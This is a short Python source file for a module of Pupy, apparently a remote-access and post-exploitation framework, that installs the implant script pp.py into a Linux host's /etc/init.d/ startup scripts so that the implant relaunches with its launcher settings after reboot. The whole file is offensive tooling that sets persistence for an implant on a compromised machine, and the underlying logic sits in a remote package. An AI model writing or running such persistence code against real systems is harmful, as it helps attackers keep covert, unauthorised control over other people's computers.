#!/usr/bin/env python
import os
from pupylib.PupyModule import *

__class_name__="SetPersistence"

def print_callback(data):
	sys.stdout.write(data)
	sys.stdout.flush()

@config(compat="unix", cat="manage")
class SetPersistence(PupyModule):
	"""Add your pp.py file to /etc/init.d/ scripts
NOTE: the pp.py script needs to be running with root privileges in order to modify the init scripts."""

	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="Linux Persistance Module", description=self.__doc__)
		self.arg_parser.add_argument('--path', help='path to your pp.py file on the system, ex: /etc/pp.py', required=True)
		self.arg_parser.add_argument('--launcher', help='change the default launcher, ex: simple')
		self.arg_parser.add_argument('--launcher-args', help='change the launcher default args')
		
	def run(self, args):
		if not args.launcher_args:
			args.launcher_args=' '.join(self.client.get_conf()["launcher_args"])
		if not args.launcher:
			args.launcher=self.client.get_conf()["launcher"]
		self.client.load_package("linux_pers")
		self.client.conn.modules['linux_pers'].add(args.path, args.launcher, args.launcher_args)
		self.success("Module executed successfully.")
